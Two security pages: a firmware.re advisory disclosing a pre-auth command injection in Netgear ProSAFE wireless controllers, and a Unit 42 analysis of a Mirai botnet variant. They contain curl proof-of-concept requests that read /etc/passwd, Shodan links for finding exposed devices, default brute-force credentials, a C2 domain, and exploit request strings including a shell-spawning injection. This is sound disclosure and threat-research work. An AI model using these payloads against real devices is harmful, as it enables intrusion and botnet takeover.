=== Content from firmware.re_61383399_20250125_162928.html ===

Ã
**Cookies are disabled!**
This site requires cookies to be enabled to work properly

* [firmware · ǝɹ (beta)](/)

* [Firmware
   Passwords
   and Keys](/keys-n-pass/)
* [Firmware
   Vulnerabilities
   and CVEs](/vulns/)
* [Firmware
   Machine Learning
   (IFIPSEC17)](/ifipsec17/)
* [Firmware
   Dynamic Analysis
   (ASIACCS16)](/asiaccs16/)
* [Firmware
   Static Analysis
   (USENIX SEC14)](/usenixsec14/)
* [Firmware
   EmbSec RevEng
   (BH13US Workshop)](/bh13us/)
* [Malware for IoT
   Comprehensive Survey
   (BHi18US)](/malw/)
* [MSL (MoonshineLuaSec)
   Lua SAST Tool
   (LangSec17)](/lua/)
* [About](/about.php)

```

################################################################################

METADATA DETAILS

Title:
    ACSA-2015-002

Timeline:
    16 Oct 2015 - [Researcher] discovery
    02 Dec 2015 - [Researcher] sends vendor notification at security@netgear.com, public disclosure set for 28 Dec 2015
    08 Dec 2015 - [Researcher] sends vendor notification at security@netgear.com with all the details an PoC, public disclosure set for 28 Dec 2015
    16 Dec 2015 - [Vendor] replies requesting "a standard 90-days grace period before public disclosure" and to fill "NETGEAR Product Vulnerability Reporting Submission Form.xlsx"
    17 Dec 2015 - [Researcher] replies with filled "ACSA-2015-002 - NETGEAR Product Vulnerability Reporting Submission Form.xlsx", agrees to 90-days grace period, asks vendor to created CVE numbers and notify/acknowledge the researcher
    12 Jan 2016 - [Researcher] follows-up with the vendor on the status and CVE numbers
    12 Jan 2016 - [Vendor] notifies researcher its team is unable to reproduce this vulnerability and "NETGEAR's Wireless Controller dev team would like to request a conference call with you and the technical team lead to discuss the findings which they are not able to reproduce"
    04 Mar 2016 - [Researcher] sends screencast to the vendor on how to reproduce the vulnerability, reminds about 90-days grace period and public disclosure 31 Mar 2016
    17 Mar 2016 - Expires 90-days grace period
    31 Mar 2016 - [Researcher] proceeds to public disclosure

Author:
    Andrei Costin, "FIRMWARE.RE" project
    andrei@firmware.re
    Vulnerability discovered using "FIRMWARE.RE" platform/service

0. Vulnerability:

Pre-auth Remote Command Execution/Injection (RCE/RCI) in the web interface can allow attackers to effectively gaining root (webserver user) access on the device

1. Vulnerable products:

Netgear ProSAFE WC9500
Netgear ProSafe WC7600
Netgear ProSafe WC7520

***

Netgear ProSAFE WC9500 High Capacity Wireless Controller ~ 4000-5000 USDS

The ProSAFE WC9500 High Capacity Wireless Controller is a scalable, high
performance WLAN solution for centralized management of up to 200 ProSAFE
wireless access points in a single wireless controller. Three WC9500 Wireless
Controller can stack into a single cluster to support up to 600 Access Points,
with a fourth WC9500 acting as a redundant backup. The supported APâs
extends from entry level single band WNAP210/WNAP320/WN370 APs to dual band
business class WNDAP360/350, and premium grade 3x3 WNDAP660/620, and outdoor
WND930 APâs, and is also 802.11ac ready. The WC9500 Wireless Controller
is easy to configure with an intuitive user interface and setup wizard,
comprehensive dashboard and monitoring statistics. Flexible enough to
support a few dozen laptops to several thousand tablets, it delivers
enterprise grade functionality for mid to large-sized organizations,
but without the cost and complexity of big IT. The WC9500 comes fully
equipped with enterprise grade features such as comprehensive wireless
security (WPA, WPA2, Radius, LDAP, Rogue AP protection), guest access,
and full networking functionality including embedded DHCP server, VLAN on
wired and wireless networks support, to full Quality of Service d
ifferentiation. Additionally, with no recurring annual license fees:
Simply pay as you grow.

***

Netgear ProSafe WC7600 Wireless LAN Controller ~ 2000-3000 USD

The NETGEAR ProSAFE WC7600 Premium Wireless Controller is a fully
featured enterprise class, high performance and secured wireless controller
capable of managing up to 150 Access Points and 6,000 concurrent clients
per cluster. The WC7600 delivers ultra-fast Access Point discovery, Layer 2
and Layer 3 fast roaming, multiple 10 Gigabit connectivity, a captive portal
for guest access, fully distributed architecture, and ease of configuration and
management.
The NETGEAR ProSAFE WC7600 Premium Wireless Controller manages the
full line of NETGEAR ProSAFE Access Points, from entry level single band APs
(WNAP210 and WNAP320), business class dual band APs (WNDAP350 and
WNDAP360), high performance 3x3:450Mbps per radio dual band selectable
and concurrent APs (WNDAP620 and WNDAP660), to specialized in-wall
mounted APs (WN370), all with a single click of a mouse.
Unlike other Wireless systems that are costly, complex and cumbersome to
deploy, the WC7600 wireless controller is ideal for K-12 education, hospitality,
and healthcare deployments. Designed with simplicity in mind for management
and ease of use, it offers enterprise grade functionality and capability for small
to mid-sized organizations, without the cost and complexity of big IT.

***

Netgear ProSafe WC7520 20-AP Wireless Controller ~ 1000-1700 USD

The NETGEAR ProSafe 20-AP Wireless Controller WC7520 offers a
high-performance and fully-featured Wireless LAN architecture to meet the
demands of medium-sized businesses, schools, and hospitals with thousands
of users. Focusing on ease-of-use, the WC7520 Controller simplifies wireless
deployments and network management with best-in-class wireless reliability,
coverage, and performance. The scalable WC7520 Controller enables businesses
to grow their wireless network as needed with a dramatic return on investment,
with optional licenses that support their changing needs. Via licensing
upgrades, the ProSafe Wireless Controller scales up to 50 access points (AP).
For larger deployments, the WC7520 Controller is stackable up to three units,
supporting up to 150-APs, including controller redundancy. Meeting the next
generation needs of larger installations, the WC7520 Controller delivers
central wireless management, integrated wireless mobility, robust top-end
security and rich converged services such as L2/L3 fast roaming, guest access
captive portal and Voice over Wi-Fi support. Built to last, the WC7520
Controller is backed by a Lifetime Warranty and delivers enterprise-class
connectivity and secure wireless LAN functionality.

***

1.1 Is it for Home / Business / Service Provider, is it a Router, Wifi, Camera, Storage, etc

Business / Enterprise / Service Provider

1.2. Vulnerable firmware:

The latest firmware of each product (as of 16 Oct 2015) was tested to be vulnerable.

2. What are the requirements to attack the affected products?

Being able to ping the affected device and open it's web interface
(192.168.1.1 or 192.168.1.254)
Being connected to the Ethernet or WiFi medium of the product, i.e.:
 - if WiFi requires WLAN authentication must first WLAN-authenticate;
 - if WiFi is open or Ethernet LAN is accessible, then there are no
other requirements then to be able to access the device web interface
(192.168.0.1 or 192.168.1.254)

2.1 WWW/WAN interfaces - does it mean that any device of this sort one can find using Shodan on the Internet, one can attack?

Yes.
https://www.shodan.io/search?query=WC7520
https://www.shodan.io/search?query=WC7600
https://www.shodan.io/search?query=WC9500

2.2 Any particular configuration required?

No.

2.3 Is the default (factory reset) version of the product affected?

Unknown, but most likely yes.

2.4 Is there a configuration change that can make the product unaffected? (turning off UPnP for example?)

No.

3. Regarding the "Pre Auth OS Command Injection" what are the requirements for this one?

 - Being able to ping the affected device and open it's web interface
(192.168.1.1 or 192.168.1.254)

3.1 What commands can be injected?

Any.
See below for a full list of commands/executables present on the affected systems.

3.2 Can parameters to this command be provided?

Yes.

3.3 Is there any restrictions on the command line "characters", for example one can only provide alpha numeric characters?

No restrictions as far as tested and analyzed.

################################################################################

TECHNICAL DETAILS

The affected systems perform the login of web interface users using the "login_handler.php" module.
The "login_handler.php" module calls the "doLogin()" function within the "/include/scripts/login_menu.js".

The doLogin() function is a simple AJAX call wrapper as follows:

    function doLogin() {
                    new ajaxRequest().sendRequest("auth_user",
                                                  $H($("login_form").serialize(true)).toJSON(),
                                                  handleLoginResp);
                    return false;

    }

The AJAX requests reach the "do_login" function in the "common.php" module, the place where is the root cause of the vulnerability.
The start of the "do_login" function in the "common.php" module looks as follows:

    function do_login() {
        /*Assignment operation happening instead of conditional check which is not valid.
         * Moreover i don't know why this if statment is written here even before a value is assigned to $user_type
         * variable. Currently removing this statment have solved the issue of mutliplea admin user login.
         */
        /*if($user_type = validate_session_info(true)) {
           return 0;
        }*/
        $retval = 0;
        $session_file_name = "/tmp/session_".$_SERVER["SERVER_ADDR"].".bin";
        $url_enc_str = rawurlencode(stripslashes($_POST["jsonData"]));
        system("/wnc/bin/json_cli \"".($_POST["reqMethod"]=="session_force_auth_user"?"force_auth_user":$_POST["reqMethod"])."\" \"".$url_enc_str."\"", $retval);
        //Error code 253 (Not supported method) and 254 (Invalid format) are returned from json cli, if the arguments are incorrect
        if($retval == 0 || $retval == 253 || $retval == 254) {
            return 1;
        }

We can see there is a "system()" PHP call to "/wnc/bin/json_cli" where the command line is created by simple unsanitized concatenation.
In particular, this part, i.e., the ternary operator ($_POST["reqMethod"]=="session_force_auth_user"?"force_auth_user":$_POST["reqMethod"]) of the command line concatenation is where the attack occurs.
The attacker controls the POST request.
By supplying a POST input called "reqMethod" that is not equal to "session_force_auth_user" AND which contains the command to be injected, the attacker controlled command call will be concatenated to the system call by the second part of the ternary operator, i.e., :$_POST["reqMethod"].

################################################################################

POC DETAILS

The PoC to trigger command execution is as follows, where the command to be injected is 'cat /etc/passwd':

curl --data 'reqMethod=json_cli_reqMethod" "json_cli_jsonData"; cat "/etc/passwd' http://wc9500/login_handler.php
curl --data 'reqMethod=json_cli_reqMethod" "json_cli_jsonData"; cat "/etc/passwd' http://wc7600/login_handler.php
curl --data 'reqMethod=json_cli_reqMethod" "json_cli_jsonData"; cat "/etc/passwd' http://wc7520/login_handler.php

################################################################################

QUICK FIX

Sanitize parameters passed to the "system("/wnc/bin/json_cli...")" call.

################################################################################

SOFTWARE ENVIRONMENT DETAILS

WC9500
    Latest FW version: 5.1.0.17
    Kernel-space:
        Linux "2.6.35.6 SMP mod_unload x86-64 64BIT LSB"
    User-space:
        BusyBox v1.2.1 (2015.09.18-07:36+0000) multi-call binary

        /bin
addgroup              cat    dd             domainname  grep      login      mknod    nice           ps         sed     ssh          stty       tracepath6   usleep
adduser               chgrp  delgroup       echo        gunzip    ls         mktemp   nisdomainname  pwd        setpci  ssh-add      su         traceroute6  vi
arping                chmod  deluser        egrep       gzip      lsmod      more     pidof          rm         sftp    ssh-agent    sync       true         watch
ash                   chown  df             false       hostname  lspci      mount    ping           rmdir      sh      ssh-keygen   tar        umount       wncinit
busybox               cp     dmesg          fgrep       kill      microperl  mv       ping6          run-parts  sleep   ssh-keyscan  touch      uname        ypdomainname
                      date   dnsdomainname  getopt      ln        mkdir      netstat  pipe_progress  scp        slogin  stat         tracepath  uncompress   zcat
        /sbin
arp     fdisk        fsck.ext3  hdparm    ifstat  klogd    mke2fs     modinfo   pivot_root  reboot  routel  rtstat                       swapon       tc
ctstat  freeramdisk  genl       hwclock   init    lnstat   mkfs.ext2  modprobe  plipconfig  rmmod   rtacct  slattach  start-stop-daemon  switch_root  udhcpc
depmod  fsck         getty      ifcfg     insmod  logread  mkfs.ext3  nameif    poweroff    route   rtmon   ss        sulogin            sysctl       vconfig
e2fsck  fsck.ext2    halt       ifconfig  ip      losetup  mkswap     nstat     rc          routef  rtpr    sshd      swapoff            syslogd

        /usr/bin
[       awk       cal    cmp       deallocvt  dumpleases  fold    fuser    id       less    mkfifo    nslookup  patch     reset    sort     tee     time        tty     wc     whoami
[[      basename  chvt   cpu-load  diff       env         free    head     install  logger  nc        od        printf    rx       strace   telnet  top         uniq    wget   xargs
ar      bunzip2   cksum  crontab   dirname    expr        ftpget  hexdump  iozone   md5sum  net-load  openvt    readlink  seq      strings  test    tr          unzip   which  yes
arping  bzcat     clear  cut       du         find        ftpput  hostid   killall  mesg    nohup     passwd    renice    sha1sum  tail     tftp    traceroute  uptime  who

        /usr/sbin
brctl  chroot  crond  ethtool  httpd  inetd  mii-tool  tcpdump  telnetd  udhcpd

################################################################################

WC7600
    Latest FW version: 5.1.0.17
    Kernel-space:
        Linux "2.6.35.6 SMP mod_unload x86-64 64BIT LSB"
    User-space:
        BusyBox v1.2.1 (2015.09.21-05:54+0000) multi-call binary

        /bin
addgroup              cat    dd             domainname  grep      login      mknod    nice           ps         sed     ssh          stty       tracepath6   usleep
adduser               chgrp  delgroup       echo        gunzip    ls         mktemp   nisdomainname  pwd        setpci  ssh-add      su         traceroute6  vi
arping                chmod  deluser        egrep       gzip      lsmod      more     pidof          rm         sftp    ssh-agent    sync       true         watch
ash                   chown  df             false       hostname  lspci      mount    ping           rmdir      sh      ssh-keygen   tar        umount       wncinit
busybox               cp     dmesg          fgrep       kill      microperl  mv       ping6          run-parts  sleep   ssh-keyscan  touch      uname        ypdomainname
                      date   dnsdomainname  getopt      ln        mkdir      netstat  pipe_progress  scp        slogin  stat         tracepath  uncompress   zcat

        /sbin
arp     fdisk        fsck.ext3  hdparm    ifstat  klogd    mke2fs     modinfo   pivot_root  reboot  routel  rtstat                       swapon       tc
ctstat  freeramdisk  genl       hwclock   init    lnstat   mkfs.ext2  modprobe  plipconfig  rmmod   rtacct  slattach  start-stop-daemon  switch_root  udhcpc
depmod  fsck         getty      ifcfg     insmod  logread  mkfs.ext3  nameif    poweroff    route   rtmon   ss        sulogin            sysctl       vconfig
e2fsck  fsck.ext2    halt       ifconfig  ip      losetup  mkswap     nstat     rc          routef  rtpr    sshd      swapoff            syslogd

        /usr/bin
[       awk       cal    cmp       deallocvt  dumpleases  fold    fuser    id       less    mkfifo    nslookup  patch     reset    sort     tee     time        tty     wc     whoami
[[      basename  chvt   cpu-load  diff       env         free    head     install  logger  nc        od        printf    rx       strace   telnet  top         uniq    wget   xargs
ar      bunzip2   cksum  crontab   dirname    expr        ftpget  hexdump  iozone   md5sum  net-load  openvt    readlink  seq      strings  test    tr          unzip   which  yes
arping  bzcat     clear  cut       du         find        ftpput  hostid   killall  mesg    nohup     passwd    renice    sha1sum  tail     tftp    traceroute  uptime  who

        /usr/sbin
brctl  chroot  crond  ethtool  httpd  inetd  mii-tool  tcpdump  telnetd  udhcpd

################################################################################

WC7520
    Latest FW version: 2.5.0.35
    Kernel-space:
        Linux "2.6.27.7-Cavium-Octeon SMP mod_unload OCTEON 64BIT MIPS64 rel2 version 1 LSB"
    User-space:
        BusyBox v1.2.1 (2015.04.22-12:18+0000) multi-call binary

        /bin
addgroup              cat    dd             domainname  grep      login      mknod    nice           pipe_progress  scp     slogin       stat   tracepath    uncompress    zcat
adduser               chgrp  delgroup       echo        gunzip    ls         mktemp   nisdomainname  ps             sed     ssh          stty   tracepath6   usleep
arping                chmod  deluser        egrep       gzip      lsmod      more     opentftpd      pwd            setpci  ssh-add      su     traceroute6  vi
ash                   chown  df             false       hostname  lspci      mount    pidof          rm             sftp    ssh-agent    sync   true         watch
busybox               cp     dmesg          fgrep       kill      microperl  mv       ping           rmdir          sh      ssh-keygen   tar    umount       wncinit
busybox               date   dnsdomainname  getopt      ln        mkdir      netstat  ping6          run-parts      sleep   ssh-keyscan  touch  uname        ypdomainname

        /sbin
arp     fdisk        fsck.ext2  halt     ifconfig  klogd    mke2fs     mkswap    nameif      poweroff  rmmod     sshd               sulogin  switch_root  udhcpc
depmod  freeramdisk  fsck.ext3  hdparm   init      logread  mkfs.ext2  modinfo   pivot_root  rc        route                        swapoff  sysctl       vconfig
e2fsck  fsck         getty      hwclock  insmod    losetup  mkfs.ext3  modprobe  plipconfig  reboot    slattach  start-stop-daemon  swapon   syslogd

        /usr/bin
[         cal       deallocvt     expr            fold                        install    lockstat-test  nandwrite           oct-linux-jtg   readlink  strings  top         wget
[[        chvt      diff          find            free                        iozone     logger         nc                  oct-linux-mdio  renice    sumtool  tr          which
ar        cksum     dirname       flashcp         ftl_check                   jffs2dump  md5sum         net-load            od              reset     tail     traceroute  who
arping    clear     docfdisk      flash_erase     ftl_format  gdbserver       killall    mesg           nftldump            oncpu           rx        tee      tty         whoami
awk       cmp       doc_loadbios  flash_eraseall  ftpget      head            ldd        mkfifo         nftl_format         openvt          seq       telnet   uniq        xargs
basename  cpu-load  du            flash_info      ftpput      hexdump         less       mkfs.jffs2     nohup               passwd          sha1sum   test     unzip       yes
bunzip2   crontab   dumpleases    flash_lock      fuser       hostid          locale     mtd_debug      nslookup            patch           sort      tftp     uptime
bzcat     cut       env           flash_unlock    gdb         id              localedef  nanddump       oct-linux-identify  printf          strace    time     wc

        /usr/sbin
brctl  chroot  crond  ctstat  ethtool  httpd  ifcfg  ifstat  inetd  ip  lnstat  mii-tool  nstat  routef  routel  rtacct  rtmon  rtpr  rtstat  ss  tc  tcpdump  telnetd  udhcpd

################################################################################

About the author/project:
    Firmware.RE is part of the Firmware Genome Project.
    Firmware.RE is a free online service that:
        - unpacks, scans and analyzes almost any firmware package and facilitates the quick detection of vulnerabilities, backdoors and all kinds of embedded malware.
        - facilitates firmware mounting, modification, loading and emulation.
        - facilitates firmware vulnerability and backdoor discovery.
        - helps secure your embedded and internet-of-things devices.

```

[Twitter](http://twitter.com/#!/FirmwareRE) |

|
[Google groups](http://groups.google.com/forum/#!forum/FirmwareRE)

[firmware.re feedback](http://firmware.idea.informer.com)  [Powered by ![](http://widget.idea.informer.com/tmpl/images/widget_logo.jpg)](http://idea.informer.com)



=== Content from unit42.paloaltonetworks.com_6a088c59_20250125_162932.html ===

[![Logo](/wp-content/uploads/2021/07/PANW_Parent.png)](https://www.paloaltonetworks.com/)

[![Unit42 Logo](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/unit42-logo-white.svg)](https://unit42.paloaltonetworks.com/)

Menu

* [Tools](https://unit42.paloaltonetworks.com/tools/)
* [ATOMs](https://unit42.paloaltonetworks.com/atoms/)
* [Security Consulting](https://www.paloaltonetworks.com/unit42)
* [About Us](https://unit42.paloaltonetworks.com/about-unit-42/)
* [**Under Attack?**](https://start.paloaltonetworks.com/contact-unit42.html)

* [Threat Research Center](https://unit42.paloaltonetworks.com "Threat Research")
* [Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/ "Threat Research")
* [Malware](https://unit42.paloaltonetworks.com/category/malware/ "Malware")

[Malware](https://unit42.paloaltonetworks.com/category/malware/)
# New Mirai Variant Targets Enterprise Wireless Presentation & Display Systems

![Clock Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-clock.svg)  5  min read

Related Products[![Advanced Threat Prevention icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/strata_RGB_logo_Icon_Color.png)Advanced Threat Prevention](https://unit42.paloaltonetworks.com/product-category/advanced-threat-prevention/ "Advanced Threat Prevention")[![Advanced URL Filtering icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/strata_RGB_logo_Icon_Color.png)Advanced URL Filtering](https://unit42.paloaltonetworks.com/product-category/advanced-url-filtering/ "Advanced URL Filtering")[![Advanced WildFire icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/strata_RGB_logo_Icon_Color.png)Advanced WildFire](https://unit42.paloaltonetworks.com/product-category/advanced-wildfire/ "Advanced WildFire")[![Cortex XDR icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/cortex_RGB_logo_Icon_Color.png)Cortex XDR](https://unit42.paloaltonetworks.com/product-category/cortex-xdr/ "Cortex XDR")

* ![Profile Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-profile-grey.svg)
  By:
  + [Ruchna Nigam](https://unit42.paloaltonetworks.com/author/ruchna-nigam/)
* ![Published Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-calendar-grey.svg)
  Published:March 18, 2019
* ![Tags Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-category.svg)Categories:
  + [Malware](https://unit42.paloaltonetworks.com/category/malware/)
  + [Threat Research](https://unit42.paloaltonetworks.com/category/threat-research/)
* ![Tags Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-tags-grey.svg)Tags:
  + [Defense](https://unit42.paloaltonetworks.com/tag/defense/)
  + [Education](https://unit42.paloaltonetworks.com/tag/education/)
  + [Finance](https://unit42.paloaltonetworks.com/tag/finance/)
  + [Government](https://unit42.paloaltonetworks.com/tag/government/)
  + [Health care](https://unit42.paloaltonetworks.com/tag/health-care/)
  + [High Tech](https://unit42.paloaltonetworks.com/tag/high-tech/)
  + [IoT](https://unit42.paloaltonetworks.com/tag/iot/)
  + [Linux](https://unit42.paloaltonetworks.com/tag/linux/)
  + [Mirai](https://unit42.paloaltonetworks.com/tag/mirai/)
  + [Retail](https://unit42.paloaltonetworks.com/tag/retail/)

* [![Download Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-download.svg)](https://unit42.paloaltonetworks.com/new-mirai-variant-targets-enterprise-wireless-presentation-display-systems/?pdf=download&lg=en&_wpnonce=01f930f2d8 "Click here to download")
* [![Print Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-print.svg)](https://unit42.paloaltonetworks.com/new-mirai-variant-targets-enterprise-wireless-presentation-display-systems/?pdf=print&lg=en&_wpnonce=01f930f2d8 "Click here to print")

Share![Down arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg)

* ![Link Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-share-link.svg)
* ![Link Email](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-sms.svg)
* [![Facebook Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-fb-share.svg)](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fnew-mirai-variant-targets-enterprise-wireless-presentation-display-systems%2F "Share in Facebook")
* [![LinkedIn Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-linkedin-share.svg)](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fnew-mirai-variant-targets-enterprise-wireless-presentation-display-systems%2F&title=New%20Mirai%20Variant%20Targets%20Enterprise%20Wireless%20Presentation%20&%20Display%20Systems "Share in LinkedIn")
* [![Twitter Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-twitter-share.svg)](https://twitter.com/intent/tweet?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fnew-mirai-variant-targets-enterprise-wireless-presentation-display-systems%2F&text=New%20Mirai%20Variant%20Targets%20Enterprise%20Wireless%20Presentation%20&%20Display%20Systems "Share in Twitter")
* [![Reddit Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-reddit-share.svg)](//www.reddit.com/submit?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fnew-mirai-variant-targets-enterprise-wireless-presentation-display-systems%2F "Share in Reddit")
* [![Mastodon Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-mastodon-share.svg)](https://mastodon.social/share?text=New%20Mirai%20Variant%20Targets%20Enterprise%20Wireless%20Presentation%20&%20Display%20Systems%20https%3A%2F%2Funit42.paloaltonetworks.com%2Fnew-mirai-variant-targets-enterprise-wireless-presentation-display-systems%2F "Share in Mastodon")

This post is also available in:
[日本語 (Japanese)](https://unit42.paloaltonetworks.jp/new-mirai-variant-targets-enterprise-wireless-presentation-display-systems/)

## Executive Summary

In early January 2019, Unit 42 discovered a new variant of the infamous IoT/Linux botnet [Mirai](https://unit42.paloaltonetworks.com/tag/mirai/).

Mirai is best known for being used in massive, unprecedented DDoS attacks in 2016. Some of the most notable targets included: web hosting provider [OVH](https://www.ovh.com/world/news/articles/a2367.the-ddos-that-didnt-break-the-camels-vac), DNS provider [Dyn](https://en.wikipedia.org/wiki/2016_Dyn_cyberattack) and [Brian Krebs’ website](https://krebsonsecurity.com/2016/09/krebsonsecurity-hit-with-record-ddos/).

This new variant that Unit 42 discovered is notable for targeting different embedded devices like routers, network storage devices, NVRs, and IP cameras and using numerous exploits against them.

In particular, Unit 42 found this new variant targeting WePresent WiPG-1000 Wireless Presentation systems, and in LG Supersign TVs. Both these devices are intended for use by businesses. This development indicates to us a potential shift to using Mirai to target enterprises. The [previous instance](https://unit42.paloaltonetworks.com/unit42-multi-exploit-iotlinux-botnets-mirai-gafgyt-target-apache-struts-sonicwall/) where we observed the botnet targeting enterprise vulnerabilities was with the incorporation of exploits against Apache Struts and SonicWall.

In addition to this newer targeting, this new variant of Mirai includes new exploits in its multi-exploit battery, as well as new credentials to use in brute force against devices.

Finally, the malicious payload was hosted at a compromised website in Colombia: an *"Electronic security, integration and alarm monitoring"* business.

These new features afford the botnet a large attack surface. In particular, targeting enterprise links also grants it access to larger bandwidth, ultimately resulting in greater firepower for the botnet for DDoS attacks.

These developments underscore the importance for enterprises to be aware of the IoT devices on their network, change default passwords, ensure that devices are fully up-to-date on patches. And in the case of devices that cannot be patched, to remove those devices from the network as a last resort.

## Exploits

This latest sample contains a total of 27 exploits, of which are 11 new to Mirai.

A full list of the exploits we have observed are listed in the Appendix. Table 1 lists exploits that haven’t been observed in the wild prior to this sample and Table 2 lists other exploits included in this variant have been observed only recently in the wild but were incorporated in variants prior to this one.

## Other Features

Aside from the incorporation of unusual exploits, this new variant had some other differentiating features:

* It makes use of the same encryption scheme as is characteristic of Mirai with a table key of 0xbeafdead.
* When decrypting strings using this key, we found certain unusual default credentials for brute force that we haven’t come across until now:
  + [admin:huigu309](https://www.websec.ca/publication/Blog/backdoors-in-Zhone-GPON-2520-and-Alcatel-Lucent-I240Q)
  + [root:huigu309](https://www.websec.ca/publication/Blog/backdoors-in-Zhone-GPON-2520-and-Alcatel-Lucent-I240Q)
  + [CRAFTSPERSON:ALC#FGU](https://www.websec.ca/publication/Blog/backdoors-in-Zhone-GPON-2520-and-Alcatel-Lucent-I240Q)
  + [root:videoflow](https://www.exploit-db.com/exploits/44387)
* It uses the domain epicrustserver[.]cf at port 3933 is for C2 communication.
* In addition to scanning for other vulnerable devices, the new version can be commanded to send out HTTP Flood DDoS attacks.

# Infrastructure

Ironically, the shell script payload (still live, at the time of this writing) fetched by the exploits in this variant is hosted at the compromised website for an *"Electronic security, integration and alarm monitoring"* business in Colombia.

[![]()](https://unit42.paloaltonetworks.com/wp-content/uploads/2020/03/Figure-1-Shell-script-payload-fetched-by-exploits.png)

*Figure 1. Shell script payload fetched by exploits*

Additionally, the binaries downloaded by the shell script were named in the format *“*clean.[arch]” (e.g. clean.x86, clean.mips etc.), however they don’t appear to be hosted at the website any longer.

Pivoting on the payload source revealed some samples fetching the same payload that were hosted at 185[.]248.140.102/bins/. The same IP was hosting some Gafgyt samples using the name format “eeppinen.[arch]” a few days prior to the upgrade to this new multi-exploit variant.

## Conclusion

IoT/Linux botnets continue to expand their attack surface, either by the incorporation of multiple exploits targeting a plethora of devices, or by adding to the list of default credentials they brute force, or both. In addition, targeting enterprise vulnerabilities allows them access to links with potentially larger bandwidth than consumer device links, affording them greater firepower for DDoS attacks.

Palo Alto Networks customers are protected by:

* WildFire detects all related samples with malicious verdicts.
* All exploits and IPs/URLs involved in these campaigns are blocked through Threat Prevention and PANDB.

AutoFocus customers can track these activities using individual exploit tags:

* [CVE-2018-17173](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2018-17173)
* [WePresentCmdInjection](https://autofocus.paloaltonetworks.com/#/tag/Unit42.WePresentCmdInjection)
* [DLinkRCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.DLinkRCE)
* [ZyxelP660HN\_RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.ZyxelP660HN_RCE)
* [CVE-2016-1555](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2016-1555)
* [NetgearDGN2200\_RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.NetgearDGN2200_RCE)
* [NetgearProsafeRCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.NetgearProsafeRCE)
* [NetgearReadyNAS\_RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.NetgearReadyNAS_RCE)
* [LinksysWAP54Gv3\_RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.LinksysWAP54Gv3_RCE)
* [CVE-2013-3568](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2013-3568)
* [ZTEH108L\_RCE](https://autofocus.paloaltonetworks.com/#/tag/Unit42.ZTEH108L_RCE)

The malware family can be tracked in AutoFocus using the tag [ELFMirai](https://autofocus.paloaltonetworks.com/#/tag/Unit42.ELFMirai)

## Appendix

| **Vulnerability** | **Affected Devices** | **Exploit Request Format** |
| --- | --- | --- |
| [CVE-2018-17173](https://www.exploit-db.com/exploits/45448) | LG Supersign TVs | GET /qsrserver/device/getThumbnail?sourceUri=''+-;rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f+|+/bin/sh+-i+2>&1+|+;%s+supersign\_p%d; >/tmp/f ;&targetUri=/tmp/thumb/test.jpg&mediaType=image&targetWidth=400&targetHeight=400&scaleType=crop&=1537275717150 HTTP/1.1 User-Agent: Hello, world  Host: [IP]:[Port]  Connection: keep-alive |
| [WePresent WiPG-1000 Command Injection](https://www.exploit-db.com/exploits/41935) | WePresent WiPG-1000 Wireless Presentation systems | POST /cgi-bin/rdfs.cgi HTTP/1.1 Host: [IP]:[Port]  Content-Type: application/x-www-form-  Content-Length: 1024 Client=;%s+wepresent\_p%d;&Download=submit |
| [DLink DCS-930L Remote Command Execution](https://www.exploit-db.com/exploits/39437) | DLink DCS-930L Network Video Cameras | POST /setSystemCommand HTTP/1.1 Host: [IP]:[Port]  Authorization: Basic YWRtaW46  Content-Type: application/x-www-form-urlencoded; charset=UTF-8  Content-Length: 1024  Connection: keep-alive    ReplySuccessPage=docmd.htm&ReplyErrorPage=docmd.htm&SystemCommand=%s+dcs930l\_p%d;&ConfigSystemCommand=Save |
| [DLink diagnostic.php Command Execution](https://www.exploit-db.com/exploits/24956) | DLink DIR-645, DIR-815 Routers | POST /diagnostic.php HTTP/1. Host: [IP]:[Port]  Content-Type: application/x-www-form-urlencoded; charset=UTF-8  Content-Length: 512    act=ping&dst=&+;%s+dlinkdir\_p%d;& |
